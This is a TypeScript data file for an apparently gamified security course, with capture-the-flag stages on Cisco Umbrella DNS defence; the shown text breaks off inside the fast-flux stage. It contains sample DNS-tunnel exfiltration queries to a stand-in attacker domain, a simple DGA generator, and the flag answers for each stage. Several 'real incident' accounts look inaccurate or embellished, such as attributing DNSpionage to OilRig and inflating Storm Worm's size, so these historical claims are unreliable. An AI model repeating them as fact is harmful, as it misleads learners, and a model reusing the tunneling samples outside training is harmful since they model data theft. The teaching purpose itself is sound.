import type { StageConfig, EpochConfig } from "./types";

export const umbrellaEpoch: EpochConfig = {
  id: "umbrella",
  name: "Cisco Umbrella",
  subtitle: "DNS Security & Threat Intelligence",
  description: "Master DNS-layer security with Cisco Umbrella — the world's most deployed cloud security platform. From DNS tunneling to DGA detection, from lookalike domains to DoH evasion, each mission puts you inside a real Umbrella SOC investigation.",
  emoji: "☂️",
  color: "indigo",
  unlocked: true,
};

export const umbrellaStages: StageConfig[] = [
  // ─── umbrella-01: DNS Architecture & Umbrella Overview ───────────────────────
  {
    epochId: "umbrella",
    wonder: { name: "Cisco Umbrella (OpenDNS) HQ", location: "San Francisco, California, USA", era: "2023 CE", emoji: "☂️" },
    id: "umbrella-01",
    order: 1,
    title: "The Invisible Shield",
    subtitle: "Cisco Umbrella — DNS-Layer Security Architecture",
    category: "cybersecurity",
    xp: 150,
    badge: { id: "umbrella-badge-01", name: "DNS Defender", emoji: "☂️" },
    challengeType: "ctf",
    info: {
      tagline: "Every connection starts with a DNS query. Umbrella secures that moment — before the packet ever leaves.",
      year: 2023,
      overview: [
        "Cisco Umbrella (formerly OpenDNS) operates the world's largest commercial recursive DNS resolver, processing over 620 billion DNS queries daily from 190 countries. By sitting at the DNS layer, Umbrella can block malicious connections before they are established — no traffic inspection required.",
        "Traditional security tools like firewalls and proxies only see traffic after a connection is made. Umbrella intercepts at the DNS resolution step, allowing it to block malware callbacks, phishing sites, and command-and-control infrastructure before any data moves. This makes it uniquely effective against threats that other tools miss.",
        "Umbrella integrates Cisco Talos threat intelligence — the world's largest commercial threat intelligence team — to keep its blocklists current. When Talos identifies a new C2 domain, Umbrella blocks it globally within minutes, protecting all customers simultaneously.",
      ],
      technical: {
        title: "How Cisco Umbrella Intercepts DNS",
        body: [
          "When an endpoint sends a DNS query, the request travels to the configured resolver. In an Umbrella-protected environment, all DNS traffic is forwarded to Umbrella's resolvers (208.67.222.222 / 208.67.220.220) via the roaming client, virtual appliance, or network-level DNS redirect.",
          "Umbrella checks each query against its categorization database and Talos threat feeds. Allowed domains resolve normally. Blocked domains return NXDOMAIN or a redirect to a block page in under 2ms. Policy can be applied per user, group, network, or device.",
          "The key advantage: Umbrella blocks at DNS before the TCP/UDP connection is ever established. Even encrypted HTTPS C2 traffic is blocked without decryption — the DNS query never resolves.",
        ],
        codeExample: {
          label: "DNS query flow — unprotected vs Umbrella-protected",
          code: `# Unprotected:
# Client → ISP DNS → Root → TLD → Authoritative → Client → Connection

# Umbrella-protected:
# Client → Umbrella (208.67.222.222) → Policy check + Talos intel
#        → [BLOCKED] NXDOMAIN — connection never forms
#        → [ALLOWED] recursive resolution → Client → Connection

# Roaming client: local DNS forwarder → Umbrella cloud (DoH)
# Resolvers: 208.67.222.222  208.67.220.220
#            2620:119:35::35  2620:119:53::53 (IPv6)`,
        },
      },
      incident: {
        title: "Trickbot BazarLoader C2 Blocked Globally (2020)",
        when: "October 2020",
        where: "Enterprise networks across 150+ countries",
        impact: "Trickbot C2 domains blocked for 90M+ Umbrella users ahead of the coordinated takedown",
        body: [
          "In October 2020, Microsoft led a coordinated takedown of Trickbot — one of the largest botnets ever, with over one million infected Windows devices. Trickbot was the primary delivery mechanism for Ryuk ransomware, which had devastated hospitals and government agencies.",
          "Cisco Talos had been tracking Trickbot's C2 infrastructure for weeks and had preemptively pushed blocklists to Umbrella. When Microsoft struck the C2 servers, Umbrella customers were already protected — their endpoints' DNS queries to Trickbot domains had been silently blocked for weeks. DNS-layer defense prevented what could have been a catastrophic ransomware wave during a global pandemic.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Infected Endpoint", sub: "DNS query: c2-prime.net", type: "attacker" },
          { label: "Cisco Umbrella Resolver", sub: "208.67.222.222 — Talos intel check", type: "system" },
          { label: "Policy: BLOCKED", sub: "Malware/C2 — WIZARD SPIDER", type: "victim" },
          { label: "NXDOMAIN Returned", sub: "connection never established", type: "result" },
        ],
      },
      timeline: [
        { year: 2006, event: "OpenDNS founded — first public DNS resolver with security filtering" },
        { year: 2012, event: "OpenDNS launches Umbrella for enterprises" },
        { year: 2015, event: "Cisco acquires OpenDNS for $635M; Talos integration begins", highlight: true },
        { year: 2018, event: "Umbrella reaches 100M+ daily users; DNS-over-HTTPS support added" },
        { year: 2020, event: "Umbrella blocks Trickbot C2 ahead of coordinated takedown", highlight: true },
        { year: 2023, event: "620B+ DNS queries/day; full SASE integration with Cisco SecureX" },
      ],
      keyTakeaways: [
        "DNS is the first step in every internet connection — blocking at DNS stops threats before data moves",
        "Umbrella operates at recursive DNS, seeing all queries — not sampled traffic",
        "Talos intelligence updates Umbrella blocklists globally within minutes of new threat discovery",
        "DNS-layer blocking defeats encrypted C2 — HTTPS is blocked before the TLS handshake",
      ],
      references: [
        { title: "Cisco Umbrella Overview", url: "https://umbrella.cisco.com/products/overview" },
        { title: "Talos — Trickbot C2 Tracking", url: "https://blog.talosintelligence.com/trickbot-back-against-takedown/" },
      ],
    },
    ctf: {
      scenario: "You just joined the SOC at a Fortune 500 company that deployed Cisco Umbrella last week. An alert fired: endpoint 10.20.5.47 queried three malware C2 domains in 90 seconds — all blocked. Investigate the DNS logs to identify the infected host and the threat actor behind the infrastructure.",
      hint: "Read the SOC alert, pull the Umbrella blocked-query logs, then run a Talos threat lookup on the primary C2 domain.",
      hints: [
        "Start with the SOC alert. Run: cat alert.txt",
        "Pull blocked DNS queries for the last hour. Run: umbrella-logs --blocked --last 1h",
        "Look up the C2 domain in Talos Investigate. Run: talos-lookup c2-prime.net",
        "Run 'assemble' to build the flag and get the submit command",
      ],
      fragments: [
        { trigger: "/alert.txt", value: "FLAG{UMBRELLA_", label: "SOC Alert — Blocked C2 Queries Detected" },
        { trigger: "umbrella-logs --blocked --last 1h", value: "DNS_F1RST_", label: "DNS Log — Infected Endpoint Identified" },
        { trigger: "talos-lookup c2-prime.net", value: "L1N3_D3F3NS3}", label: "Talos Lookup — WIZARD SPIDER Attribution" },
      ],
      files: {
        "/alert.txt": [
          "=== CISCO UMBRELLA SOC ALERT ===",
          "Severity: HIGH   Time: 2023-11-14 09:17:43 UTC",
          "",
          "Endpoint 10.20.5.47 (WKSTN-FINANCE-09) queried 3 domains",
          "categorized as Malware C2 within a 90-second window.",
          "All queries blocked by Umbrella policy.",
          "",
          "Blocked domains:",
          "  c2-prime.net      (Malware/C2 — Trickbot variant)",
          "  update-svc.io     (Malware/C2 — Trickbot variant)",
          "  d347f9a.xyz       (Malware/C2 — DGA generated)",
          "",
          "Next step: isolate endpoint, investigate infection vector.",
          "Reference: Talos TID-2023-11-114",
        ].join("\n"),
        "/umbrella-policy.txt": [
          "Umbrella Policy: FINANCE-SEGMENT",
          "Security categories — BLOCKED:",
          "  Malware, C2/Callbacks, Phishing, Cryptomining,",
          "  Newly Seen Domains, Dynamic DNS",
          "Allow list: intranet.corp, hr.internal",
          "Block list: Talos feed (3.2M domains, updated every 5 min)",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "alert.txt", isDir: false }, { name: "umbrella-policy.txt", isDir: false }] },
      extraCommands: {
        "umbrella-logs": (_args: string[]) => ({
          lines: [
            "=== UMBRELLA DNS ACTIVITY — BLOCKED — LAST 1H ===",
            "09:16:12  10.20.5.47  update-svc.io    BLOCKED  Malware/C2",
            "09:17:01  10.20.5.47  c2-prime.net     BLOCKED  Malware/C2",
            "09:17:43  10.20.5.47  d347f9a.xyz      BLOCKED  Malware/C2 (DGA)",
            "",
            "Infected host: 10.20.5.47  WKSTN-FINANCE-09",
            "User: j.rodriguez@corp.com",
            "Infection vector: Outlook attachment opened at 09:14",
            "Fragment collected.",
          ],
        }),
        "talos-lookup": (args: string[]) => {
          const domain = args[0] ?? "";
          if (domain === "c2-prime.net") {
            return {
              lines: [
                "Cisco Talos Investigate — c2-prime.net",
                "Threat score: 95/100 (CRITICAL)",
                "Category: Malware C2 — Trickbot BazarLoader",
                "First seen: 2023-11-08   Registrar: Namecheap (privacy)",
                "Resolved IP: 185.220.101.47 (Tor exit — RU)",
                "Threat actor: WIZARD SPIDER (Conti/Ryuk ransomware group)",
                "Related: update-svc.io, bazar-cdn.net",
                "",
                "Recommendation: block all WIZARD SPIDER infrastructure.",
                "Fragment collected. Run 'assemble' to build the flag.",
              ],
            };
          }
          return { lines: [`No results for '${domain}'. Try: talos-lookup c2-prime.net`] };
        },
      },
      chatbotContext: "Cisco Umbrella DNS-layer security. Umbrella resolvers: 208.67.222.222/220.220. Scenario: endpoint 10.20.5.47 (WKSTN-FINANCE-09, user j.rodriguez) infected with Trickbot BazarLoader, queried c2-prime.net/update-svc.io/d347f9a.xyz (all blocked). Threat actor: WIZARD SPIDER. Fragment sequence: cat alert.txt → umbrella-logs --blocked --last 1h → talos-lookup c2-prime.net → assemble.",
    },
  },

  // ─── umbrella-02: DNS Tunneling ───────────────────────────────────────────────
  {
    epochId: "umbrella",
    wonder: { name: "Marina Bay Financial Centre", location: "Singapore", era: "2022 CE", emoji: "🏦" },
    id: "umbrella-02",
    order: 2,
    title: "The Hollow Pipe",
    subtitle: "DNS Tunneling — Data Exfiltration Over Port 53",
    category: "cybersecurity",
    xp: 175,
    badge: { id: "umbrella-badge-02", name: "Tunnel Buster", emoji: "🔍" },
    challengeType: "ctf",
    info: {
      tagline: "Firewalls block every port — except DNS. Attackers encode entire data streams inside DNS queries.",
      year: 2022,
      overview: [
        "DNS tunneling encodes arbitrary data inside DNS query and response packets, turning the DNS protocol into a covert communication channel. Because DNS traffic (UDP/53) is almost universally allowed through firewalls, and because DNS is inherently bidirectional, it creates a reliable tunnel even through the most restrictive network controls.",
        "Tools like dnscat2 and iodine establish full TCP/IP tunnels over DNS: the client encodes data in subdomain labels (e.g., aGVsbG8=.tunnel.attacker.com) and the authoritative nameserver for attacker.com decodes them. An attacker with code execution on an air-gapped or firewalled machine can exfiltrate data, establish a reverse shell, or receive C2 commands — all over port 53.",
        "Cisco Umbrella detects DNS tunneling through behavioral analysis: abnormally high query rates, unusually long subdomain labels, high entropy in query strings, and abnormal TXT/NULL record usage. A normal user generates ~200 DNS queries per day; a DNS tunnel generates thousands per minute.",
      ],
      technical: {
        title: "How DNS Tunneling Works",
        body: [
          "In a DNS tunnel, the attacker controls a domain (tunnel.evil.com) and its authoritative nameserver. The victim machine runs a tunneling client (dnscat2, iodine) that encodes outbound data as subdomain labels in DNS A or TXT queries. The attacker's nameserver decodes the data and sends responses with encoded return data.",
          "Data capacity is constrained by DNS label limits (63 chars per label, 253 chars total domain name). Typical throughput: 1–10 KB/s. This is enough for a reverse shell, credential exfiltration, or slow data theft over weeks. iodine can achieve up to 1Mbit/s using NULL record payloads.",
          "Detection signatures: query labels >40 chars, high entropy (base64/hex encoded), >10 queries/second to a single domain, TXT or NULL record queries, and domains registered within the last 30 days.",
        ],
        codeExample: {
          label: "DNS tunnel query — data encoded in subdomain labels",
          code: `# Normal DNS query:
# A? www.google.com

# DNS tunnel query (dnscat2 encoding payload in subdomain):
# A? aGVsbG8gd29ybGQ=.s1.tunnel.attacker.com
# A? Y2xvc2VkX2Nvbm5lY3Rpb24=.s2.tunnel.attacker.com
# TXT? d2hvYW1p.tunnel.attacker.com

# Umbrella detection signals:
# - label length: 28 chars (base64 payload)
# - entropy: 4.1 bits/byte (high — encoded data)
# - rate: 847 queries/min to tunnel.attacker.com
# - record type: TXT (unusual for normal browsing)`,
        },
      },
      incident: {
        title: "OilRig (APT34) DNS Tunneling Exfiltration — Middle East (2016–2019)",
        when: "2016–2019 (discovered 2017)",
        where: "Government agencies and financial institutions across the Middle East",
        impact: "Years of undetected data exfiltration via custom DNS tunneling tool (ALMA Communicator)",
        body: [
          "OilRig (APT34), an Iranian state-sponsored threat actor, used custom DNS tunneling malware — dubbed ALMA Communicator and DNSpionage — to exfiltrate data from government and financial targets across the Middle East for over three years without detection.",
          "The malware encoded stolen credentials and documents in DNS TXT record queries to attacker-controlled domains. Because DNS is typically not inspected at the payload level and is always allowed through firewalls, the exfiltration went unnoticed. Cisco Talos ultimately identified the campaign by analyzing abnormal DNS query patterns — high volume, high entropy subdomains, all to recently-registered domains. Umbrella's behavioral detection would have flagged this pattern on day one.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Compromised Host", sub: "dnscat2 client encoding payload", type: "attacker" },
          { label: "DNS Query", sub: "aGVsbG8=.tunnel.evil.com (TXT)", type: "system" },
          { label: "Attacker Nameserver", sub: "decodes payload — returns command", type: "victim" },
          { label: "Umbrella Detection", sub: "high entropy + 847 qps → BLOCKED", type: "result" },
        ],
      },
      timeline: [
        { year: 2004, event: "NSTX — first public DNS tunnel proof-of-concept" },
        { year: 2010, event: "iodine released — full IP tunnel over DNS for pentesters" },
        { year: 2015, event: "dnscat2 released — encrypted C2 channel over DNS", highlight: true },
        { year: 2016, event: "OilRig begins using ALMA Communicator DNS tunnel against Middle East targets" },
        { year: 2017, event: "Cisco Talos exposes DNSpionage campaign; Umbrella behavioral detection published", highlight: true },
        { year: 2022, event: "DNS tunneling used in 26% of advanced persistent threat campaigns (CrowdStrike data)" },
      ],
      keyTakeaways: [
        "DNS tunneling exploits the fact that UDP/53 is almost never blocked by firewalls",
        "Detection relies on behavioral signals: query rate, label entropy, record type, domain age",
        "Cisco Umbrella's behavioral analysis flags DNS tunneling without needing to decrypt traffic",
        "OilRig used DNS tunneling for 3+ years undetected — DNS inspection is not optional",
      ],
      references: [
        { title: "Talos — DNSpionage Campaign Targets Middle East", url: "https://blog.talosintelligence.com/dnspionage-campaign-targets-middle-east/" },
        { title: "Umbrella DNS Tunneling Detection", url: "https://umbrella.cisco.com/info/dns-tunneling" },
      ],
    },
    ctf: {
      scenario: "A Singapore bank's Umbrella dashboard shows anomalous DNS query patterns from a workstation in the trading floor network: 847 queries per minute to a single external domain, with base64-encoded subdomain labels up to 58 characters long. Investigate the tunnel, identify what's being exfiltrated, and determine the C2 domain.",
      hint: "Analyze the DNS query log for the suspicious host, decode a sample payload, then block the tunnel domain.",
      hints: [
        "Review the DNS anomaly report. Run: cat dns-anomaly.txt",
        "Analyze query entropy and decode a payload. Run: dns-analyze 10.50.2.33",
        "Block the tunnel domain in Umbrella. Run: umbrella-block tunnel.sgp-exfil.com",
        "Run 'assemble' to build the flag",
      ],
      fragments: [
        { trigger: "/dns-anomaly.txt", value: "FLAG{DNS_", label: "Anomaly Report — Tunnel Traffic Identified" },
        { trigger: "dns-analyze 10.50.2.33", value: "TUNN3L_D4T4_", label: "Payload Decoded — Credentials in Transit" },
        { trigger: "umbrella-block tunnel.sgp-exfil.com", value: "3XF1L_CAUGHT}", label: "Tunnel Domain Blocked — Exfiltration Stopped" },
      ],
      files: {
        "/dns-anomaly.txt": [
          "=== UMBRELLA BEHAVIORAL ALERT — DNS ANOMALY ===",
          "Host: 10.50.2.33 (TRDFLOOR-WS-07)  Time: 2022-08-03 14:22 SGT",
          "",
          "Anomaly signals detected:",
          "  Query rate:      847 queries/min (baseline: 3/min)",
          "  Target domain:   tunnel.sgp-exfil.com",
          "  Label length:    avg 54 chars (max normal: 20)",
          "  Entropy:         4.3 bits/byte (encoded data)",
          "  Record types:    TXT 61%, A 39%",
          "  Domain age:      6 days (newly registered)",
          "",
          "Sample queries:",
          "  dXNlcjphZG1pbiBwYXNzOlN1cGVyU2VjcmV0MTIz.tunnel.sgp-exfil.com",
          "  c3RhZ2luZ19kYl9jcmVkczpzM2NyM3Q=.tunnel.sgp-exfil.com",
          "",
          "Confidence: DNS TUNNEL (high)",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "dns-anomaly.txt", isDir: false }] },
      extraCommands: {
        "dns-analyze": (args: string[]) => {
          const host = args[0] ?? "";
          if (host === "10.50.2.33") {
            return {
              lines: [
                "DNS Tunnel Analysis — 10.50.2.33",
                "Tool fingerprint: dnscat2 v0.07 (TXT record mode)",
                "",
                "Decoded payloads (base64):",
                "  'user:admin pass:SuperSecret123'",
                "  'staging_db_creds:s3cr3t'",
                "  'trade_exec_api_key:TK-9f2a81c'",
                "",
                "Exfiltrated data: trading system credentials + API keys",
                "Volume: ~2.1MB over 18 minutes",
                "C2 server: 45.155.91.22 (NL — bulletproof hosting)",
                "Fragment collected.",
              ],
            };
          }
          return { lines: [`No data for host '${host}'. Try: dns-analyze 10.50.2.33`] };
        },
        "umbrella-block": (args: string[]) => {
          const domain = args[0] ?? "";
          if (domain === "tunnel.sgp-exfil.com") {
            return {
              lines: [
                `Blocking domain: ${domain}`,
                "Added to custom block list — effective immediately",
                "All DNS queries to tunnel.sgp-exfil.com → NXDOMAIN",
                "Tunnel connection dropped. Exfiltration stopped.",
                "Incident ticket created: INC-2022-0803-001",
                "Fragment collected. Run 'assemble' to build the flag.",
              ],
            };
          }
          return { lines: [`Usage: umbrella-block <domain>`] };
        },
      },
      chatbotContext: "DNS tunneling via dnscat2. Host 10.50.2.33 (TRDFLOOR-WS-07) is tunneling trading credentials over DNS to tunnel.sgp-exfil.com (C2: 45.155.91.22). Encoded payloads contain admin creds and API keys. Detection signals: 847 qps, 54-char labels, 4.3 bits/byte entropy, TXT records, 6-day-old domain. Fragment sequence: cat dns-anomaly.txt → dns-analyze 10.50.2.33 → umbrella-block tunnel.sgp-exfil.com → assemble.",
    },
  },

  // ─── umbrella-03: DGA Detection ───────────────────────────────────────────────
  {
    epochId: "umbrella",
    wonder: { name: "NHS Barts Health Trust", location: "London, United Kingdom", era: "2021 CE", emoji: "🏥" },
    id: "umbrella-03",
    order: 3,
    title: "The Pattern Generator",
    subtitle: "Domain Generation Algorithms — Detecting DGA-Based C2",
    category: "cybersecurity",
    xp: 175,
    badge: { id: "umbrella-badge-03", name: "DGA Hunter", emoji: "🎯" },
    challengeType: "ctf",
    info: {
      tagline: "Malware generates thousands of random-looking domains per day. Only one resolves — and that's the C2.",
      year: 2021,
      overview: [
        "Domain Generation Algorithms (DGAs) are used by malware to generate large numbers of pseudo-random domain names that the infected host attempts to resolve. The attacker pre-computes the same algorithm and registers only one or two of the generated domains as the actual C2 server. This makes takedown nearly impossible — blocking one domain is useless if the malware can generate 1,000 more.",
        "DGA families like Conficker, GameOver Zeus, Locky, and Emotet generate domains using seeds like the current date, making the domain list predictable for the attacker (who can register next week's domain in advance) but unpredictable for defenders who don't know the algorithm.",
        "Cisco Umbrella detects DGA domains through statistical analysis of DNS query streams: high NXDOMAIN rates, high entropy in domain names (random-looking character distributions), short domain lifespans, and patterns in query timing that match known DGA families.",
      ],
      technical: {
        title: "How DGAs Work and How Umbrella Detects Them",
        body: [
          "A typical DGA seeds a pseudo-random number generator with a value the malware and attacker can both compute (current date, a hard-coded constant, or a value from a public source). It generates N domains per seed cycle — daily, weekly, or per-hour. The malware attempts to resolve all of them; most return NXDOMAIN. The one that resolves is the active C2.",
          "Conficker used a date-seeded DGA generating 250 domains/day across multiple TLDs. GameOver Zeus used a P2P DGA. Locky's DGA generated 1,000 domains/day. Emotet changed DGA algorithms every major version. Defeating a DGA botnet requires either reverse-engineering the algorithm (to sink-hole future domains) or detecting the infection via NXDOMAIN storm analysis.",
          "Umbrella's DGA detection uses machine learning on query streams: it flags hosts generating >50 NXDOMAIN responses within a short window, especially where the failing domains show high lexical entropy (consonant clusters, alternating patterns typical of PRNG output). Known DGA family fingerprints are matched against Talos signatures.",
        ],
        codeExample: {
          label: "Emotet DGA — date-seeded domain generation (simplified)",
          code: `# Emotet generates domains from current date + hard-coded constants
import datetime, hashlib

seed = datetime.date.today().strftime("%Y%m%d") + "E3F1"
domains = []
for i in range(100):
    h = hashlib.md5(f"{seed}{i}".encode()).hexdigest()[:12]
    tld = ["com","net","org","info"][i % 4]
    domains.append(f"{h}.{tld}")

# Output (date: 2021-04-21):
# a3f8c2d91b4e.com  (NXDOMAIN)
# 7b2e9f4a1c3d.net  (NXDOMAIN)
# f1a4b8e3c2d9.org  → RESOLVES → C2 server
# ...997 more NXDOMAINs`,
        },
      },
      incident: {
        title: "Emotet DGA Infection — UK NHS Hospital Network (2021)",
        when: "January 2021",
        where: "NHS Barts Health Trust, London — 2,500 endpoints",
        impact: "Emotet DGA activity detected on 14 hosts; ransomware pre-positioning blocked before deployment",
        body: [
          "In January 2021, Cisco Umbrella detected an Emotet outbreak at a large London NHS trust. Fourteen workstations had been silently infected over the holiday period and were generating Emotet's characteristic DGA traffic — hundreds of NXDOMAIN responses per hour, with one domain per day successfully resolving to receive updated payloads.",
          "Umbrella's DGA behavioral detection flagged the infected hosts within hours of the first query storm. Because Umbrella blocked all DGA domains (both registered and not), the Emotet instances could not receive the Ryuk ransomware stage-2 payload they were configured to download. The trust avoided a ransomware incident that had paralyzed several peer NHS trusts that same month.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Emotet-Infected Host", sub: "generates 100 DGA domains/day", type: "attacker" },
          { label: "DNS Storm", sub: "99 NXDOMAIN + 1 resolve", type: "system" },
          { label: "Umbrella DGA Detection", sub: "ML flags entropy + NXDOMAIN rate", type: "victim" },
          { label: "All DGA Blocked", sub: "Ryuk payload never delivered", type: "result" },
        ],
      },
      timeline: [
        { year: 2008, event: "Conficker worm — first widespread DGA botnet (250 domains/day)", highlight: true },
        { year: 2011, event: "GameOver Zeus uses P2P DGA — nearly impossible to sinkhole" },
        { year: 2016, event: "Locky ransomware generates 1,000 DGA domains/day" },
        { year: 2018, event: "Emotet v4 introduces new DGA algorithm; becomes top global threat" },
        { year: 2021, event: "Europol Emotet takedown; Umbrella DGA detection blocks resurgence", highlight: true },
        { year: 2022, event: "Emotet rebuilds with updated DGA — Umbrella ML model updated within 48h" },
      ],
      keyTakeaways: [
        "DGAs make C2 infrastructure resilient — blocking one domain is useless against 1,000/day generation",
        "Detection relies on NXDOMAIN storm analysis and lexical entropy of queried domains",
        "Umbrella's ML model detects DGA activity even for previously unseen DGA families",
        "Blocking at DNS stops DGA-based ransomware from receiving stage-2 payloads",
      ],
      references: [
        { title: "Talos — Emotet DGA Analysis", url: "https://blog.talosintelligence.com/emotet-dga/" },
        { title: "Umbrella DGA Detection Blog", url: "https://umbrella.cisco.com/blog/dga-detection" },
      ],
    },
    ctf: {
      scenario: "A London NHS hospital's Umbrella dashboard is showing a NXDOMAIN storm from a radiology workstation — 340 failed DNS lookups in the last 30 minutes, with domain names that look machine-generated. Identify the DGA family, find the one domain that resolved (the active C2), and quarantine the host.",
      hint: "Review the NXDOMAIN storm report, fingerprint the DGA family, then look up the one domain that successfully resolved.",
      hints: [
        "Read the NXDOMAIN storm report. Run: cat nxdomain-storm.txt",
        "Fingerprint the DGA family from query patterns. Run: dga-analyze 10.8.4.19",
        "Look up the active C2 that resolved. Run: talos-lookup f1a4b8e3c2d9.org",
        "Run 'assemble' to build the flag",
      ],
      fragments: [
        { trigger: "/nxdomain-storm.txt", value: "FLAG{DGA_", label: "NXDOMAIN Storm Report — DGA Activity Confirmed" },
        { trigger: "dga-analyze 10.8.4.19", value: "3NTR0PY_C2_", label: "DGA Family Identified — Emotet v4" },
        { trigger: "talos-lookup f1a4b8e3c2d9.org", value: "D0M41N_D3T3CT3D}", label: "Active C2 Found — Host Quarantined" },
      ],
      files: {
        "/nxdomain-storm.txt": [
          "=== UMBRELLA DGA ALERT — NXDOMAIN STORM ===",
          "Host: 10.8.4.19 (RADIOLOGY-WS-03)   Time: 2021-01-18 11:40 GMT",
          "",
          "NXDOMAIN responses: 340 in 30 minutes (baseline: 2/hour)",
          "Unique domains queried: 338",
          "Successful resolutions: 1  →  f1a4b8e3c2d9.org",
          "",
          "Sample failing domains (all NXDOMAIN):",
          "  a3f8c2d91b4e.com",
          "  7b2e9f4a1c3d.net",
          "  c9d2e1f4a8b3.info",
          "  e4f1a2b9c3d8.net",
          "  ...(334 more)",
          "",
          "Lexical entropy: 3.98 bits/byte (machine-generated)",
          "Pattern: 12-char hex strings — matches known DGA profile",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "nxdomain-storm.txt", isDir: false }] },
      extraCommands: {
        "dga-analyze": (args: string[]) => {
          const host = args[0] ?? "";
          if (host === "10.8.4.19") {
            return {
              lines: [
                "DGA Fingerprint Analysis — 10.8.4.19",
                "Algorithm match: Emotet v4 DGA (confidence: 94%)",
                "Seed type: date-based (YYYYMMDD + hardcoded constant)",
                "Generation rate: ~100 domains/day across .com/.net/.org/.info",
                "Domain format: 12-char lowercase hex string",
                "",
                "Active C2 today: f1a4b8e3c2d9.org (1 of 100 registered)",
                "Stage-2 payload: Ryuk ransomware dropper (not yet downloaded)",
                "Umbrella blocked all 100 DGA domains for today.",
                "Fragment collected.",
              ],
            };
          }
          return { lines: [`No data for '${host}'. Try: dga-analyze 10.8.4.19`] };
        },
        "talos-lookup": (args: string[]) => {
          const domain = args[0] ?? "";
          if (domain === "f1a4b8e3c2d9.org") {
            return {
              lines: [
                "Cisco Talos Investigate — f1a4b8e3c2d9.org",
                "Threat score: 98/100 (CRITICAL)",
                "Category: Malware C2 — Emotet v4 (DGA active C2)",
                "Resolved IP: 91.121.55.18 (FR — bulletproof hosting)",
                "Registered: 2021-01-17 (1 day ago — DGA seed: 20210118)",
                "Payload hosted: Ryuk ransomware dropper (PE32)",
                "",
                "Status: BLOCKED by Umbrella DGA detection",
                "Host 10.8.4.19 quarantined. Ryuk never delivered.",
                "Fragment collected. Run 'assemble' to build the flag.",
              ],
            };
          }
          return { lines: [`No results for '${domain}'. Try: talos-lookup f1a4b8e3c2d9.org`] };
        },
      },
      chatbotContext: "DGA detection scenario. Host 10.8.4.19 (RADIOLOGY-WS-03) infected with Emotet v4, generating 100 DGA domains/day (date-seeded, 12-char hex, .com/.net/.org/.info). NXDOMAIN storm: 338 failures, 1 success (f1a4b8e3c2d9.org → 91.121.55.18, Ryuk dropper). Umbrella blocked all DGA domains. Fragment sequence: cat nxdomain-storm.txt → dga-analyze 10.8.4.19 → talos-lookup f1a4b8e3c2d9.org → assemble.",
    },
  },

  // ─── umbrella-04: Fast Flux DNS ───────────────────────────────────────────────
  {
    epochId: "umbrella",
    wonder: { name: "NYSE Data Center", location: "Mahwah, New Jersey, USA", era: "2023 CE", emoji: "📈" },
    id: "umbrella-04",
    order: 4,
    title: "The Shifting Sands",
    subtitle: "Fast Flux Networks — IP Rotation to Evade Takedown",
    category: "cybersecurity",
    xp: 175,
    badge: { id: "umbrella-badge-04", name: "Flux Tracker", emoji: "🌪️" },
    challengeType: "ctf",
    info: {
      tagline: "The domain never changes. The IP behind it rotates every 5 minutes through 10,000 compromised hosts.",
      year: 2023,
      overview: [
        "Fast flux is a DNS evasion technique where the IP addresses associated with a domain rotate rapidly — typically every 300 seconds (the TTL) — through a large pool of compromised hosts acting as proxies. The actual malicious server sits behind this rotating shield. Blocking any individual IP is useless; the next query returns a different one.",
        "Single-flux fast flux rotates A records only. Double-flux (more advanced) also rotates the NS records for the domain, making the authoritative nameserver itself a moving target. This makes infrastructure takedown nearly impossible without seizing the registrar-level domain record.",
        "Cisco Umbrella detects fast flux through TTL analysis and IP diversity metrics: domains with TTLs of 300s or less, more than 30 unique IPs in 24 hours, IPs spanning multiple ASNs and countries, and low TTL/high IP-diversity ratios that don't match legitimate CDN patterns.",
      ],
      technical: {
        title: "Single-Flux and Double-Flux Architecture",
        body: [
          "In single-flux networks, the attacker registers a domain and configures its DNS to return a rotating set of IP addresses — all belonging to compromised hosts (bots). Each bot forwards traffic to the real backend server. TTL is set to 300 seconds, forcing resolvers to re-query frequently and preventing caching from exposing the full IP pool.",
          "Double-flux extends this by also rotating the NS records. The nameservers for the malicious domain are themselves compromised hosts, making it impossible to identify and block the authoritative DNS server. Storm Worm (2007) pioneered double-flux at scale, using millions of infected PCs as both flux nodes and nameservers.",
          "Detection heuristics: TTL ≤ 300s, unique IPs per domain per 24h > 30, geographic span > 5 countries, ASN count > 10, no pattern matching legitimate CDN providers (Cloudflare, Akamai, Fastly all show consistent ASN/IP ranges despite IP rotation).",
        ],
        codeExample: {
          label: "Fast flux DNS response — A record rotating every 300s",
          code: `# Query 1 — 14:00:00:
# dig A flux-c2.net → 91.121.55.18 (FR)  TTL: 300

# Query 2 — 14:05:01:
# dig A flux-c2.net → 185.234.216.45 (UA)  TTL: 300

# Query 3 — 14:10:02:
# dig A flux-c2.net → 45.155.91.22 (NL)  TTL: 300

# 24-hour profile:
# Unique IPs: 287   ASNs: 41   Countries: 23
# All IPs: compromised home routers / VPS / cloud VMs
# Real backend: 10.0.0.1 (attacker infra — never exposed in DNS)`,
        },
      },
      incident: {
        title: "Storm Worm Fast Flux Botnet — Global Resilience Operation (2007)",
        when: "2007–2008",
        where: "Global — 50M+ infected Windows PCs across 190 countries",
        impact: "First major fast-flux botnet; withstood takedown attempts for 18 months due to IP rotation",
        body: [
          "Storm Worm (Nuwar) built the first large-scale fast-flux botnet in 2007, using double-flux with 50 million infected PCs serving as both proxies and nameservers. When security researchers attempted to take down the infrastructure by blocking IPs or contacting hosting providers, the botnet simply rotated to new nodes. Each takedown attempt was countered within minutes.",
          "Storm was used for spam, DDoS-for-hire, and credential theft. Its fast-flux architecture kept it operational for 18 months despite international law enforcement efforts. The Conficker botnet later refined these techniques, and modern ransomware groups use fast-flux-as-a-service platforms built from the same blueprint.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Victim Endpoint", sub: "DNS query: flux-c2.net", type: "attacker" },
          { label: "Fast Flux Pool", sub: "287 IPs, TTL=300s, 23 countries", type: "system" },
          { label: "Umbrella Detection", sub: "TTL+diversity anomaly — BLOCKED", type: "victim" },
          { label: "Real Backend Hidden", sub: "never exposed; flux nodes absorb hits", type: "result" },
        ],
      },
      timeline: [
        { year: 2007, event: "Storm Worm introduces double-flux with 50M infected PCs", highlight: true },
        { year: 2009, event: "Conficker uses fast flux for resilience against takedown" },
        { year: 2012, event: "Fast-flux-as-a-service platforms appear on dark web forums" },
